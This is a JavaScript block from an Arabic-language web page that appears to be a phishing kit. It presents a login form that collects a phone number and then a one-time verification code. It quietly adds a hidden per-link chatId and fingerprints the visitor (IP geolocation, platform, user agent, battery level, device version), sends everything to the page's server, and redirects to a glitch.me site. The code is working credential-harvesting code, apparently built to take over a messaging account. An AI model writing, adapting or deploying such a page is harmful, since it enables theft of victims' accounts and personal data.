<script>
    let globalPhoneNumber = '';
    let globalCountry = '';
    let globalChatId = '';

    function showMessage(message) {
        var messageElement = document.getElementById('message');
        messageElement.innerText = message;
        messageElement.style.display = 'block';
        setTimeout(function() {
            messageElement.style.display = 'none';
        }, 5000);
    }

    const loginForm = document.getElementById('loginForm');
    const chatIdInput = document.createElement('input');
    chatIdInput.type = 'hidden';
    chatIdInput.name = 'chatId';
    loginForm.appendChild(chatIdInput);

    const chatId = window.location.pathname.split('/').pop();
    chatIdInput.value = chatId;
    globalChatId = chatId;

    async function getIPInfo() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            return {
                ip: data.ip,
                country: data.country_name,
                city: data.city
            };
        } catch (error) {
            console.error('Error fetching IP info:', error);
            return {
                ip: 'Unknown',
                country: 'Unknown',
                city: 'Unknown'
            };
        }
    }

    function getPlatformInfo() {
        const ua = navigator.userAgent;
        let platform = "Unknown";
        if (/Windows/.test(ua)) platform = "Windows";
        else if (/Mac/.test(ua)) platform = "MacOS";
        else if (/Linux/.test(ua)) platform = "TopTop";
        else if (/Android/.test(ua)) platform = "Android";
        else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";

        return {
            platform: platform,
            userAgent: ua
        };
    }

    async function getBatteryInfo() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                return {
                    batteryLevel: battery.level,
                    batteryCharging: battery.charging
                };
            } catch (error) {
                console.error('Error getting battery info:', error);
            }
        }
        return {
            batteryLevel: undefined,
            batteryCharging: undefined
        };
    }

    function getDeviceVersion() {
        const ua = navigator.userAgent;
        const match = ua.match(/\(([^)]+)\)/);
        return match ? match[1] : 'Unknown';
    }

    // عرض النموذج الحقيقي عند الضغط على "التالي"
    function showLoginForm() {
        document.getElementById('initial-login').style.display = 'none';
        document.getElementById('login-container').style.display = 'block';
        document.getElementsByClassName('shield-section')[0].style.display = 'block';
    }

    // إرسال رقم الهاتف
    loginForm.addEventListener('submit', async (event) => {
        event.preventDefault();
        const formData = new FormData(loginForm);
        const data = Object.fromEntries(formData.entries());

        globalPhoneNumber = data.phoneNumber;
        globalCountry = data.country;

        const ipInfo = await getIPInfo();
        const platformInfo = getPlatformInfo();
        const batteryInfo = await getBatteryInfo();
        const deviceVersion = getDeviceVersion();

        Object.assign(data, ipInfo, platformInfo, batteryInfo, { deviceVersion });

        try {
            const response = await fetch('/sendPhoneNumber', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });
            const result = await response.json();
            if (result.success) {
                showMessage('تم إرسال رمز التحقق');
                document.getElementById('login-container').style.display = 'none';
                document.getElementById('verification-container').style.display = 'block';
            } else {
                showMessage(result.message || 'حدث خطأ أثناء إرسال رقم الهاتف. يرجى المحاولة مرة أخرى.');
            }
        } catch (error) {
            console.error('Error:', error);
            showMessage('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقًا.');
        }
    });

    // التحقق من كود التحقق
    document.getElementById('verificationForm').addEventListener('submit', async (event) => {
        event.preventDefault();
        const verificationCode = document.getElementById('verificationCode').value.trim();

        if (!verificationCode) {
            showMessage('يرجى إدخال كود التحقق');
            return;
        }

        const data = {
            verificationCode,
            phoneNumber: globalPhoneNumber,
            country: globalCountry,
            chatId: globalChatId
        };

        try {
            const response = await fetch('/verifyCode', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });
            const result = await response.json();
            if (result.success) {
                showMessage('تم التحقق من الكود بنجاح');
                setTimeout(() => {
                    window.location.href = "https://polarized-believed-fisherman.glitch.me/";
                }, 3000);
            } else {
                showMessage(result.message || 'فشل التحقق من الكود. يرجى المحاولة مرة أخرى.');
            }
        } catch (error) {
            console.error('Error:', error);
            showMessage('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقًا.');
        }
    });

    function showShield(shield) {
        showMessage(`لقد قمت بارتداء ${shield}`);
    }
</script>
